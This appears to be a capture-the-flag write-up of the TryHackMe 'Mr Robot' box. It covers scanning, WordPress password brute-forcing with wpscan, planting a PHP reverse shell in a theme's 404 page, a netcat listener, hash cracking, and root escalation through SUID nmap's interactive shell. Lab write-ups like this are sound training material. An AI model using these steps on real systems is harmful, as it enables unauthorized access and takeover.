# Mr Robot THM

---

![](./.assets/logo.jpeg)


---

## Index
- [Enumeration](#enumeration)
- [Finding Vunerabilities](#finding-vunerabilities)
- [Reverse Shell and PrivEsc](#reverse-shell-and-privesc)
- [Final Thoughts](#final-thoughts)

---

```bash
export IP=10.10.181.6
```

---

### Enumeration

```bash
nmap -sC -sV -v -A $IP -oN nmap/initial.nmap
```

`initial`
```
# Nmap 7.91 scan initiated Tue Jul 20 16:06:26 2021 as: nmap -vvv -p 80,443 -sC -sV -A -v -oN nmap/initial.nmap 10.10.77.212
Nmap scan report for 10.10.77.212
Host is up, received syn-ack (0.14s latency).
Scanned at 2021-07-20 16:06:28 +04 for 34s

PORT    STATE SERVICE  REASON  VERSION
80/tcp  open  http     syn-ack Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http syn-ack Apache httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 20 16:07:02 2021 -- 1 IP address (1 host up) scanned in 36.03 seconds
```

There's not much here, except the fact we know that our exploit will be via HTML and likely through some sort of RFI.

We should start enumerating the website with `gobuster` to find potential weaknesses

```bash
gobuster dir -u $IP -w ~/wordlists/website_dir/directory-list-2.3-small.txt -o gobuster/buster_small.gobuster
```
(Note increasing the amount of threads is _not **recommended**_)

```
/images               (Status: 301) [Size: 236]
/blog                 (Status: 301) [Size: 234]
/sitemap              (Status: 200) [Size: 0]
/rss                  (Status: 301) [Size: 0]
/login                (Status: 302) [Size: 0]
/0                    (Status: 301) [Size: 0]
/admin                (Status: 301) [Size: 235]
```

A few directories quickly reveal that this is a wordpress site.

---

### Finding Vunerabilities

Wordpress and vunerability goes hand-in-hand, hence it is time to fire up `wp-scan`

```bash
wp-scan --url $IP -e vp,vt,u
```

Looking at the results of it, there is nothing really standing out except `robots.txt` existing. Navigating to that reveals the first key as well as the name of what appears to be a wordlist for us to exploit.

Considering the sheer size of this wordlist, I have reason to believe that it has duplicates.
To confirm this, I run

```bash
wc fosocity.dic
# 858160
# Remove duplicates
cat fosocity | sort | uniq > pruned.txt
wc pruned.txt
# 11451
```

That's nearly 75 _times_ the amount of words we would have had to check.

I prefer using wpscan to brute force wordpress sites. They tend to be easier on the eyes when debugging (@hydra)

```bash
wpscan --url $IP -U pruned.txt -P pruned.txt
```

After waiting some time (this room is extremely slow) we gain the credentials for a user `Elliot` and their password `<<REDACTED>>`

We can now login as Elliot and check what we can modify to gain a reverse shell onto the box.

---

### Reverse Shell and PrivEsc

I notice they have the ability to modify the **php** code of themes. I chose the theme `twentyfifteen` and changed the `404.php` code to `revshell.php`

I can now access the modified file from `http://$IP/wp-content/twentyfifteen/404.php` to gain a reverse-shell

```bash
netcat -lvnp 9999
---
python -c "import pty; pty.spawn('/bin/bash')" # God I hate the default shell
```

Curiously, instead of the typical `www-data` we have spawned as daemon.

Navigating to the only home directory of the only user on the box `robot`, I realise that I cannot access the `key-2-of-3.txt` flag but they have their password hash stored alongside it, which we can read.

Cracking `robot`'s hash proves to be trivial, it is a simple MD5 hash that rockyou will crack in seconds.

We grab the user flag and now look to escalate our priviledges. Getting `linpeas` on the machine was an unneeded pain (this box is slow...) and running it reveals a very interesting SUID binary: `nmap`.

Checking GTFObins for PrivEsc related to nmap was a mild letdown as it only pointed to file read or write or shells but I fairly confident that I could escalate my priviledge without reading `root.txt` or `key-3-of-3.txt` indirectly.

Doing some quick googling revealed a simple way to spawn a root shell with nmap:

```bash
nmap --interactive
nmap> !sh
$ whoami
root
```

And we are now root! And we can access `key-3-of-3.txt` and this box is complete!

---

### Final Thoughts

Fun box hampered by its _s-l-u-g-g-i-s-h_ performance. I love themed boxes and enjoyed playing around with the default page...despite how slow it is.
I'd recommend this box, especially to premium users whose machines have extra resources.
I will say that it definitely feels beginner to intermediate; and I'm only giving it intermediate based on the fact that it is extremely challenging for new users who are still getting to grips with enumeration and its interpretation due to how long it takes to correct errors.

![](https://i.imgur.com/GafsLEl.png)
